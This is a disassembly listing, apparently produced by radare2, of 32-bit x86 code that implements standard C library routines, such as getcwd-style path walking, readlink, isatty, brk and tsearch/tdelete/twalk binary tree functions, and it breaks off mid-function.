cmp byte [ecx], 0x2f
je 0x8079863
mov dword [0x80aa9d8], 0
call fcn.08048b20
mov edx, dword [eax]
cmp edx, 0xd
je 0x8079818
xor eax, eax
cmp edx, 0x24
cmove eax, dword [0x80aa9d8]
mov dword [0x80aa9d8], eax
mov edx, dword [var_10h]
test edx, edx
je 0x807984f
mov edx, dword [var_10h]
mov eax, dword [var_14h]
call 0x8079930
test eax, eax
mov ebx, eax
je 0x8079837
mov eax, ebx
jmp 0x8079779
test esi, esi
jne 0x8079830
mov eax, dword [var_10h]
test eax, eax
je 0x8079830
mov edx, dword [var_14h]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079830
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08051180
mov dword [var_14h], 0
jmp 0x807981f
cmp eax, ebx
jae 0x807988b
mov ebx, dword [var_14h]
test esi, esi
mov byte [eax + ebx], 0
jne 0x8079777
mov ecx, dword [var_10h]
test ecx, ecx
jne 0x807978b
inc eax
mov dword [var_sp_4h], eax
jmp 0x807979d
test esi, esi
jne 0x80797c6
mov dword [esp], ecx
call fcn.08051180
jmp 0x80797c6
test esi, esi
jne 0x80797c6
mov eax, dword [var_14h]
mov dword [esp], eax
jmp 0x8079896
mov dword [0x80aa9d4], 1
mov dword [0x80aa9d8], 1
jmp 0x80797ca
call fcn.08048b20
neg dword [var_18h]
mov edx, dword [var_18h]
mov dword [var_18h], 0xffffffff
mov dword [eax], edx
jmp 0x807976c
mov dword [esp], edi
call fcn.08050fe0
mov dword [var_14h], eax
mov edx, dword [var_14h]
xor eax, eax
test edx, edx
je 0x8079779
mov eax, dword [0x80aa9d4]
jmp 0x807974e
call fcn.08048b20
mov dword [eax], 0x16
jmp 0x80797c6
mov edx, dword [var_10h]
mov eax, esi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
jmp 0x8079930
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc8
mov dword [var_80h], 0xe0
mov dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
mov dword [var_74h], edx
mov dword [var_70h], eax
mov dword [var_78h], str._proc
call fcn.08048b20
mov ecx, dword [var_74h]
mov edx, dword [eax]
test ecx, ecx
mov dword [var_a8h], ecx
mov dword [var_a4h], edx
jne 0x8079986
mov edx, dword [var_70h_2]
mov dword [var_a8h_2], 0x1001
test edx, edx
jne 0x8079ecb
mov esi, dword [var_70h]
test esi, esi
mov dword [var_9ch], esi
je 0x8079ea2
mov edx, dword [var_9ch]
lea ecx, [var_6ch]
add edx, dword [var_a8h]
mov ebx, edx
dec edx
mov dword [var_a0h], edx
mov byte [edx], 0
mov dword [esp], 3
mov dword [esp + 8], ecx
mov dword [esp + 4], 0x80a348f
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
lea ecx, [var_6ch]
mov dword [var_8ch], edx
mov dword [var_90h], eax
mov edx, dword [var_60h]
mov dword [var_98h], edx
mov dword [esp], 3
mov dword [esp + 4], 0x80a7290
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079d90
mov edx, dword [var_68h]
mov eax, dword [var_6ch]
mov dword [var_84h], edx
mov dword [var_88h], eax
mov edx, dword [var_60h]
mov eax, dword [var_90h]
xor eax, dword [var_88h]
mov dword [var_94h], edx
mov edx, dword [var_8ch]
xor edx, dword [var_84h]
or edx, eax
je 0x8079e8b
mov esi, dword [var_7ch]
cmp dword [var_78h], esi
je 0x8079e05
sub dword [var_78h], 3
lea esi, [var_6ch]
mov dword [esp + 8], esi
mov eax, dword [var_78h]
mov dword [esp], 3
mov dword [esp + 4], eax
call fcn.08090000
test eax, eax
js 0x8079d7c
mov edx, dword [var_6ch]
mov ecx, dword [var_68h]
mov esi, dword [var_78h]
mov dword [var_b4h], edx
mov dword [var_b0h], ecx
mov eax, dword [var_b4h]
mov edx, dword [var_b0h]
xor eax, dword [var_90h]
xor edx, dword [var_8ch]
mov ecx, dword [var_60h]
mov dword [var_b8h], ecx
or eax, edx
setne byte [var_b9h]
mov dword [esp], esi
call fcn.0808f9c0
test eax, eax
mov dword [var_ach], eax
je 0x8079d7c
call fcn.08048b20
mov edi, dword [var_7ch]
add edi, dword [var_80h]
mov dword [eax], 0
sub edi, esi
mov edx, dword [var_ach]
mov dword [esp], edx
call fcn.0808fc00
test eax, eax
mov esi, eax
je 0x8079dc6
cmp byte [esi + 0xb], 0x2e
je 0x8079deb
cmp byte [var_b9h], 0
jne 0x8079b1a
mov eax, dword [var_98h_2]
cmp dword [esi], eax
jne 0x8079ae5
movzx eax, word [esi + 8]
mov dword [var_c0h], esp
lea eax, [eax + edi + 8]
and eax, 0xfffffffc
sub esp, eax
mov dword [esp + 8], edi
lea ebx, [var_b9h]
mov edx, dword [var_78h_2]
and ebx, 0xfffffff0
mov dword [esp], ebx
mov dword [esp + 4], edx
call fcn.08053740
lea edx, [esi + 0xb]
mov byte [eax], 0x2f
mov dword [esp + 4], edx
inc eax
mov dword [esp], eax
call fcn.0808dc90
mov dword [esp], 3
mov dword [esp + 4], ebx
lea ecx, [var_6ch_2]
mov dword [esp + 8], ecx
call fcn.08090000
test eax, eax
js 0x8079b98
mov eax, dword [var_6ch_2]
mov edx, dword [var_68h_2]
mov ecx, dword [var_8ch_2]
xor eax, dword [var_90h_2]
xor ecx, edx
or ecx, eax
jne 0x8079b98
mov eax, dword [var_98h_2]
cmp dword [var_60h_2], eax
je 0x8079ba3
mov esp, dword [var_c0h_2]
jmp 0x8079ae5
test esi, esi
mov esp, dword [var_c0h_2]
je 0x8079dc6
add esi, 0xb
mov dword [var_c4h], esi
mov dword [esp], esi
call fcn.08053400
mov esi, dword [var_a0h_2]
sub esi, dword [var_9ch_2]
mov edi, eax
cmp esi, eax
mov dword [var_c8h], esi
ja 0x8079c54
mov esi, dword [var_74h_2]
test esi, esi
jne 0x8079dab
mov esi, dword [var_a8h_2]
cmp eax, esi
mov eax, esi
cmovae eax, edi
add eax, eax
mov dword [var_a8h_2], eax
mov dword [esp + 4], eax
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d63
mov eax, dword [var_9ch_2]
mov ecx, dword [var_a8h_2]
add eax, esi
lea edx, [ecx + ebx]
mov esi, dword [var_c8h]
sub eax, dword [var_a0h_2]
lea ecx, [esi + ebx]
mov dword [esp + 4], ecx
sub edx, eax
mov dword [esp + 8], eax
mov dword [esp], edx
call fcn.08053770
mov dword [var_9ch_2], ebx
mov dword [var_a0h_2], eax
sub dword [var_a0h_2], edi
mov dword [esp + 8], edi
mov eax, dword [var_c4h]
mov dword [esp + 4], eax
mov edx, dword [var_a0h_2]
mov dword [esp], edx
call fcn.08053770
dec dword [var_a0h_2]
mov ecx, dword [var_a0h_2]
mov byte [ecx], 0x2f
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
mov edx, dword [var_b0h_2]
mov eax, dword [var_b4h_2]
mov dword [var_8ch_2], edx
mov dword [var_90h_2], eax
mov edx, dword [var_b8h_2]
mov eax, dword [var_90h_2]
xor eax, dword [var_88h_2]
mov dword [var_98h_2], edx
mov edx, dword [var_8ch_2]
xor edx, dword [var_84h_2]
or edx, eax
jne 0x8079a4b
mov ecx, dword [var_94h_2]
cmp dword [var_b8h_2], ecx
jne 0x8079a4b
mov esi, dword [var_9ch_2]
mov eax, dword [var_a8h_2]
lea ebx, [eax + esi]
lea eax, [ebx - 1]
cmp dword [var_a0h_2], eax
je 0x8079d54
cmp dword [var_7ch_2], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d17
mov ecx, dword [var_7ch_2]
mov dword [esp], ecx
call fcn.08051180
sub ebx, dword [var_a0h_2]
mov dword [esp + 8], ebx
mov esi, dword [var_a0h_2]
mov dword [esp + 4], esi
mov eax, dword [var_9ch_2]
mov dword [esp], eax
call fcn.08053690
call fcn.08048b20
mov edx, dword [var_a4h_2]
mov dword [eax], edx
mov eax, dword [var_9ch_2]
lea esp, [var_ch_2]
pop ebx
pop esi
pop edi
leave
ret
lea edx, [ebx - 2]
mov dword [var_a0h_2], edx
mov byte [ebx - 2], 0x2f
jmp 0x8079d03
mov ecx, dword [var_ach_2]
mov dword [esp], ecx
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0xc
cmp dword [var_7ch], str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079d90
mov eax, dword [var_7ch]
mov dword [esp], eax
call fcn.08051180
mov ebx, dword [var_70h]
test ebx, ebx
je 0x8079d9b
xor eax, eax
jmp 0x8079d4c
mov edx, dword [var_9ch]
mov dword [esp], edx
call fcn.08051180
jmp 0x8079d97
mov esi, dword [var_ach_2]
mov dword [esp], esi
call fcn.0808fb60
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8079d7c
call fcn.08048b20
mov ecx, dword [var_ach]
mov ebx, dword [eax]
mov esi, eax
mov dword [esp], ecx
call fcn.0808fb60
mov eax, 2
test ebx, ebx
cmove ebx, eax
mov dword [esi], ebx
jmp 0x8079d7c
cmp byte [esi + 0xc], 0
je 0x8079ae5
cmp word [esi + 0xc], 0x2e
jne 0x8079b07
jmp 0x8079ae5
cmp esi, str..._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._.._..
je 0x8079e56
mov esi, dword [var_80h_2]
lea eax, [esi + esi + 1]
mov dword [esp + 4], eax
mov eax, dword [var_7ch_2]
mov dword [esp], eax
call fcn.08051220
test eax, eax
mov ebx, eax
je 0x8079d7c
add esi, eax
mov dword [var_78h_2], esi
mov edx, dword [var_80h]
mov dword [esp + 4], ebx
mov dword [esp + 8], edx
mov ecx, dword [var_78h]
mov dword [esp], ecx
call fcn.08053740
mov byte [eax], 0
mov dword [var_7ch], ebx
shl dword [var_80h], 1
jmp 0x8079a57
mov edx, dword [var_80h]
lea eax, [edx + edx + 1]
mov dword [esp], eax
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x8079d7c
mov ecx, dword [var_80h]
mov dword [esp], eax
mov dword [esp + 4], 0x80a34a0
mov dword [esp + 8], ecx
call fcn.08053740
mov dword [var_78h], eax
jmp 0x8079e32
mov ecx, dword [var_94h]
cmp dword [var_98h], ecx
jne 0x8079a4b
jmp 0x8079cf8
mov eax, dword [var_a8h]
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_9ch], eax
mov edi, dword [var_9ch]
xor eax, eax
test edi, edi
jne 0x8079997
jmp 0x8079d4c
mov dword [eax], 0x16
jmp 0x8079d97
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x48
lea eax, [var_40h]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08079f40
test eax, eax
sete al
leave
movzx eax, al
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x55
int 0x80
pop ebx
cmp eax, 0xfffff001
jae fcn.080564b0
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ecx, 0x5401
mov ebp, esp
push edi
push ebx
lea edx, [var_38h]
sub esp, 0x3c
mov edi, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, 0x36
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x8079fc2
mov eax, dword [var_38h]
mov dword [edi], eax
mov eax, dword [var_34h]
mov dword [edi + 4], eax
mov edx, dword [var_30h]
mov dword [edi + 8], edx
and edx, 0x100f
mov eax, dword [var_2ch]
mov dword [edi + 0xc], eax
movzx eax, byte [var_28h]
mov dword [edi + 0x38], edx
mov dword [edi + 0x34], edx
mov byte [edi + 0x10], al
lea eax, [var_27h]
mov dword [var_8h], 0x13
mov dword [var_4h], eax
lea eax, [edi + 0x11]
mov dword [esp], eax
call fcn.08053740
mov ecx, 3
mov edi, eax
xor eax, eax
cld
rep stosd dword es:[edi], eax
mov byte [edi], 0
mov eax, ebx
add esp, 0x3c
pop ebx
pop edi
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x8079f66
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, 0x2d
int 0x80
xor edx, edx
cmp eax, ebx
mov dword [0x80aa9dc], eax
jb 0x807a000
mov ebx, dword [esp]
mov eax, edx
leave
ret
call fcn.08048b20
mov edx, 0xffffffff
mov dword [eax], 0xc
jmp 0x8079ff9
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0x10
lea eax, [var_8h]
mov dword [esp], 7
mov dword [var_4h], eax
call fcn.08090180
mov edx, eax
mov eax, 0x100
test edx, edx
cmovns eax, dword [var_8h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 0xc
cmp dword [arg_1ch], 1
mov eax, dword [arg_8h]
mov dword [esp], ebx
mov dword [var_4h], esi
mov dword [var_8h], edi
mov ebx, dword [arg_ch]
mov ecx, dword [eax]
je 0x807a180
mov eax, dword [ecx + 8]
test eax, eax
je 0x807a132
mov edx, dword [ecx + 4]
test edx, edx
je 0x807a132
test byte [eax + 0xc], 1
je 0x807a132
test byte [edx + 0xc], 1
je 0x807a132
or byte [ecx + 0xc], 1
test eax, eax
je 0x807a0d1
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 4]
test eax, eax
je 0x807a0dc
and byte [eax + 0xc], 0xfe
test ebx, ebx
je 0x807a132
mov esi, dword [ebx]
movzx ebx, byte [esi + 0xc]
test bl, 1
je 0x807a132
mov eax, dword [arg_10h]
mov edi, dword [eax]
mov eax, dword [arg_14h]
test eax, eax
mov eax, dword [arg_18h]
setg dl
test eax, eax
setg al
xor eax, edx
test al, 1
je 0x807a153
or ebx, 1
mov byte [esi + 0xc], bl
or byte [edi + 0xc], 1
and byte [ecx + 0xc], 0xfe
mov edx, dword [arg_14h]
test edx, edx
js 0x807a13f
mov eax, dword [ecx + 4]
mov dword [esi + 8], eax
mov eax, dword [ecx + 8]
mov dword [ecx + 4], esi
mov dword [edi + 4], eax
mov dword [ecx + 8], edi
mov eax, dword [arg_10h]
mov dword [eax], ecx
mov ebx, dword [esp]
mov esi, dword [var_4h]
mov edi, dword [var_8h]
leave
ret
mov eax, dword [ecx + 8]
mov dword [esi + 4], eax
mov eax, dword [ecx + 4]
mov dword [ecx + 8], esi
mov dword [edi + 8], eax
mov dword [ecx + 4], edi
jmp 0x807a12d
mov eax, dword [arg_10h]
mov dword [eax], esi
and byte [esi + 0xc], 0xfe
or byte [edi + 0xc], 1
mov eax, dword [arg_14h]
test eax, eax
js 0x807a172
mov eax, dword [esi + 4]
mov dword [esi + 4], edi
mov dword [edi + 8], eax
jmp 0x807a132
mov eax, dword [esi + 8]
mov dword [esi + 8], edi
mov dword [edi + 4], eax
jmp 0x807a132
lea esi, [esi]
mov eax, dword [ecx + 8]
jmp 0x807a0c5
nop
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x2c
mov dword [var_20h], 0
mov dword [var_1ch], 0
mov edi, dword [arg_ch]
mov dword [var_10h], 0
mov dword [var_14h], 0
mov dword [var_18h], 0
test edi, edi
je 0x807a2b4
mov eax, dword [edi]
test eax, eax
je 0x807a1d5
and byte [eax + 0xc], 0xfe
mov eax, dword [edi]
test eax, eax
mov esi, edi
je 0x807a25a
nop
lea esi, [esi]
mov ebx, dword [edi]
mov eax, dword [ebx]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call dword [arg_10h]
mov dword [var_18h], eax
mov ecx, dword [var_18h]
mov eax, ebx
test ecx, ecx
je 0x807a2b4
mov eax, dword [var_20h]
mov dword [var_sp_14h], 0
mov dword [esp], edi
lea esi, [ebx + 4]
mov dword [var_sp_10h], eax
mov eax, dword [var_1ch]
mov dword [var_ch], eax
mov eax, dword [var_14h]
mov dword [var_8h], eax
mov eax, dword [var_10h]
mov dword [var_4h], eax
call fcn.0807a080
mov edx, dword [var_18h]
lea eax, [ebx + 8]
test edx, edx
cmovns esi, eax
mov eax, dword [esi]
test eax, eax
je 0x807a25a
mov eax, dword [var_10h]
mov dword [var_10h], edi
mov edi, esi
mov dword [var_14h], eax
mov eax, dword [var_1ch]
mov dword [var_20h], eax
mov eax, dword [var_18h]
mov dword [var_1ch], eax
jmp 0x807a1e0
mov dword [esp], 0x10
call fcn.08050fe0
test eax, eax
mov ebx, eax
je 0x807a285
mov dword [esi], eax
mov dword [ebx + 4], 0
mov dword [ebx + 8], 0
mov eax, dword [arg_8h]
or byte [ebx + 0xc], 1
mov dword [ebx], eax
cmp esi, edi
je 0x807a2b2
mov eax, dword [var_1ch]
mov dword [var_sp_14h], 1
mov dword [var_4h], edi
mov dword [esp], esi
mov dword [var_sp_10h], eax
mov eax, dword [var_18h]
mov dword [var_ch], eax
mov eax, dword [var_10h]
mov dword [var_8h], eax
call fcn.0807a080
mov eax, ebx
add esp, 0x2c
pop ebx
pop esi
pop edi
leave
ret
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edx, dword [arg_ch]
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
test edx, edx
je 0x807a308
mov eax, dword [edx]
test eax, eax
je 0x807a306
mov ebx, eax
mov eax, dword [ebx]
mov dword [esp], edi
mov dword [var_4h], eax
call esi
mov ecx, eax
mov eax, ebx
test ecx, ecx
je 0x807a308
lea eax, [ebx + 4]
lea edx, [ebx + 8]
test ecx, ecx
cmovns eax, edx
mov eax, dword [eax]
test eax, eax
mov ebx, eax
jne 0x807a2e0
xor eax, eax
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
push ebp
xor edx, edx
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xdc
mov dword [ebp - 0x20], 0
mov dword [ebp - 0x1c], 0x28
mov ebx, dword [ebp + 0xc]
lea eax, [esp + 8]
mov dword [ebp - 0x24], eax
test ebx, ebx
je 0x807a393
mov esi, dword [ebx]
test esi, esi
je 0x807a393
mov eax, esi
mov dword [ebp - 0x30], 0x5f
lea esi, [esi]
mov eax, dword [eax]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call dword [ebp + 0x10]
test eax, eax
mov edx, eax
je 0x807a3ce
mov ecx, dword [ebp - 0x1c]
cmp dword [ebp - 0x20], ecx
je 0x807a39d
mov ecx, dword [ebp - 0x20]
mov esi, dword [ebx]
mov edi, dword [ebp - 0x24]
add dword [ebp - 0x30], 4
lea eax, [esi + 8]
mov dword [edi + ecx*4], ebx
lea ebx, [esi + 4]
inc ecx
test edx, edx
mov dword [ebp - 0x20], ecx
cmovns ebx, eax
xor edx, edx
mov eax, dword [ebx]
test eax, eax
jne 0x807a350
lea esp, [ebp - 0xc]
mov eax, edx
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [ebp - 0x30]
mov edi, dword [ebp - 0x20]
mov ecx, dword [ebp - 0x20]
mov esi, dword [ebp - 0x24]
cld
and eax, 0xfffffff0
add edi, 0x14
sub esp, eax
shl ecx, 2
mov dword [ebp - 0x1c], edi
lea eax, [esp + 8]
shr ecx, 2
mov dword [ebp - 0x34], eax
mov edi, eax
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [ebp - 0x34]
mov dword [ebp - 0x24], eax
jmp 0x807a36d
mov edx, dword [ebx]
mov dword [ebp - 0x10], esi
mov ecx, edx
mov dword [ebp - 0x14], edx
mov edx, dword [edx + 8]
mov esi, dword [ecx + 4]
test esi, esi
je 0x807a6ce
test edx, edx
je 0x807a6ce
mov eax, dword [ebp - 0x14]
mov ecx, dword [ebp - 0x20]
mov edx, ebx
add eax, 8
lea ecx, [ecx*4 + 0x5f]
mov dword [ebp - 0x28], eax
mov dword [ebp - 0x2c], ecx
mov edi, dword [ebp - 0x1c]
cmp dword [ebp - 0x20], edi
je 0x807a699
mov ecx, dword [ebp - 0x20]
mov edi, dword [ebp - 0x24]
add dword [ebp - 0x2c], 4
mov dword [edi + ecx*4], edx
mov edx, dword [ebp - 0x28]
inc ecx
mov dword [ebp - 0x20], ecx
mov eax, dword [edx]
mov ecx, dword [eax + 4]
test ecx, ecx
je 0x807a437
add eax, 4
mov dword [ebp - 0x28], eax
jmp 0x807a406
mov dword [ebp - 0x18], eax
mov eax, dword [ebp - 0x18]
mov edx, dword [eax + 4]
test edx, edx
je 0x807a691
mov edi, dword [ebp - 0x20]
test edi, edi
jne 0x807a66d
mov dword [ebx], edx
mov eax, dword [ebp - 0x14]
cmp dword [ebp - 0x18], eax
je 0x807a467
mov ecx, dword [ebp - 0x18]
mov ebx, dword [ebp - 0x14]
mov eax, dword [ecx]
mov dword [ebx], eax
mov edi, dword [ebp - 0x18]
test byte [edi + 0xc], 1
jne 0x807a52a
mov esi, dword [ebp - 0x20]
test esi, esi
jle 0x807a522
test edx, edx
je 0x807a490
test byte [edx + 0xc], 1
jne 0x807a522
lea esi, [esi]
mov eax, dword [ebp - 0x20]
mov ecx, dword [ebp - 0x24]
mov edi, dword [ecx + eax*4 - 4]
mov esi, dword [edi]
mov eax, dword [esi + 4]
cmp edx, eax
je 0x807a5ad
test eax, eax
mov ecx, eax
je 0x807a4dd
movzx eax, byte [eax + 0xc]
test al, 1
je 0x807a4dd
and eax, 0xfffffffe
mov byte [ecx + 0xc], al
or byte [esi + 0xc], 1
mov eax, dword [ecx + 8]
mov edx, dword [ebp - 0x20]
mov dword [ecx + 8], esi
mov dword [esi + 4], eax
mov dword [edi], ecx
lea edi, [ecx + 8]
mov ecx, dword [ebp - 0x24]
mov dword [ecx + edx*4], edi
mov ecx, dword [esi + 4]
inc edx
mov dword [ebp - 0x20], edx
mov ebx, dword [ecx + 8]
test ebx, ebx
je 0x807a4ee
test byte [ebx + 0xc], 1
jne 0x807a5a8
mov eax, dword [ecx + 4]
test eax, eax
je 0x807a500
test byte [eax + 0xc], 1
jne 0x807a53d
nop
lea esi, [esi]
or byte [ecx + 0xc], 1
mov edx, esi
dec dword [ebp - 0x20]
mov ebx, dword [ebp - 0x20]
test ebx, ebx
jle 0x807a522
test edx, edx
je 0x807a490
test byte [edx + 0xc], 1
je 0x807a490
test edx, edx
je 0x807a52a
and byte [edx + 0xc], 0xfe
mov ebx, dword [ebp - 0x18]
mov dword [esp], ebx
call fcn.08051180
mov edx, dword [ebp - 0x10]
jmp 0x807a393
test eax, eax
je 0x807a547
test byte [eax + 0xc], 1
jne 0x807a57d
movzx edx, byte [esi + 0xc]
movzx eax, byte [ebx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ebx + 0xc], al
mov eax, dword [ebx + 8]
mov dword [esi + 4], eax
mov eax, dword [ebx + 4]
mov dword [ebx + 4], ecx
mov dword [ecx + 8], eax
mov dword [ebx + 8], esi
mov dword [edi], ebx
and byte [esi + 0xc], 0xfe
mov dword [ebp - 0x20], 1
xor edx, edx
jmp 0x807a506
movzx edx, byte [esi + 0xc]
movzx eax, byte [ecx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ecx + 0xc], al
and byte [esi + 0xc], 0xfe
mov eax, dword [ecx + 4]
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 8]
mov dword [ecx + 8], esi
mov dword [esi + 4], eax
mov dword [edi], ecx
jmp 0x807a572
mov eax, dword [ecx + 4]
jmp 0x807a53d
mov ecx, dword [esi + 8]
test ecx, ecx
je 0x807a5e4
movzx eax, byte [ecx + 0xc]
test al, 1
je 0x807a5e4
and eax, 0xfffffffe
mov byte [ecx + 0xc], al
or byte [esi + 0xc], 1
mov eax, dword [ecx + 4]
mov ebx, dword [ebp - 0x20]
mov dword [ecx + 4], esi
mov dword [esi + 8], eax
mov eax, dword [ebp - 0x24]
mov dword [edi], ecx
lea edi, [ecx + 4]
mov ecx, dword [esi + 8]
mov dword [eax + ebx*4], edi
inc ebx
mov dword [ebp - 0x20], ebx
mov eax, dword [ecx + 4]
test eax, eax
mov ebx, eax
je 0x807a5f3
test byte [eax + 0xc], 1
jne 0x807a668
mov eax, dword [ecx + 8]
test eax, eax
je 0x807a500
test byte [eax + 0xc], 1
je 0x807a500
test eax, eax
je 0x807a612
test byte [eax + 0xc], 1
jne 0x807a63c
movzx edx, byte [esi + 0xc]
movzx eax, byte [ebx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ebx + 0xc], al
mov eax, dword [ebx + 4]
mov dword [esi + 8], eax
mov eax, dword [ebx + 8]
mov dword [ebx + 8], ecx
mov dword [ecx + 4], eax
mov dword [ebx + 4], esi
jmp 0x807a56c
movzx edx, byte [esi + 0xc]
movzx eax, byte [ecx + 0xc]
and edx, 1
and eax, 0xfffffffe
or eax, edx
mov byte [ecx + 0xc], al
and byte [esi + 0xc], 0xfe
mov eax, dword [ecx + 8]
and byte [eax + 0xc], 0xfe
mov eax, dword [ecx + 4]
mov dword [ecx + 4], esi
mov dword [esi + 8], eax
jmp 0x807a5a4
mov eax, dword [ecx + 8]
jmp 0x807a608
mov ecx, dword [ebp - 0x20]
mov ebx, dword [ebp - 0x24]
mov edi, dword [ebp - 0x18]
mov eax, dword [ebx + ecx*4 - 4]
mov ecx, dword [eax]
cmp edi, dword [ecx + 8]
je 0x807a689
mov dword [ecx + 4], edx
jmp 0x807a455
mov dword [ecx + 8], edx
jmp 0x807a455
mov edx, dword [eax + 8]
jmp 0x807a448
mov eax, dword [ebp - 0x20]
mov esi, dword [ebp - 0x24]
cld
add eax, 0x14
mov dword [ebp - 0x1c], eax
mov eax, dword [ebp - 0x2c]
and eax, 0xfffffff0
sub esp, eax
lea ecx, [esp + 8]
mov dword [ebp - 0x34], ecx
mov edi, dword [ebp - 0x34]
mov ecx, dword [ebp - 0x20]
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [ebp - 0x34]
mov dword [ebp - 0x24], eax
jmp 0x807a412
mov edi, dword [ebp - 0x14]
mov dword [ebp - 0x18], edi
jmp 0x807a43a
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov dword [var_4h], edi
mov ebx, eax
mov esi, ecx
mov edi, edx
mov eax, dword [eax + 4]
test eax, eax
jne 0x807a703
mov eax, dword [ebx + 8]
test eax, eax
je 0x807a767
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 0
mov dword [esp], ebx
call edi
mov eax, dword [ebx + 4]
test eax, eax
jne 0x807a75b
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 1
mov dword [esp], ebx
call edi
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a74f
mov dword [var_sp_8h], esi
mov dword [var_sp_4h], 2
mov dword [esp], ebx
call edi
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
lea ecx, [esi + 1]
mov edx, edi
call 0x807a6e0
jmp 0x807a733
lea ecx, [esi + 1]
mov edx, edi
call 0x807a6e0
jmp 0x807a71b
mov dword [var_sp_8h], ecx
mov dword [var_sp_4h], 3
jmp 0x807a73f
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
test eax, eax
je 0x807a799
test edx, edx
je 0x807a799
xor ecx, ecx
leave
jmp 0x807a6e0
leave
ret
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, eax
mov eax, dword [eax + 4]
mov esi, edx
test eax, eax
jne 0x807a7de
mov eax, dword [ebx + 8]
test eax, eax
jne 0x807a7d5
mov eax, dword [ebx]
mov dword [esp], eax
call esi
mov dword [esp], ebx
call fcn.08051180
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
mov edx, esi
call fcn.0807a7a0
jmp 0x807a7be
call fcn.0807a7a0
jmp 0x807a7b7
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
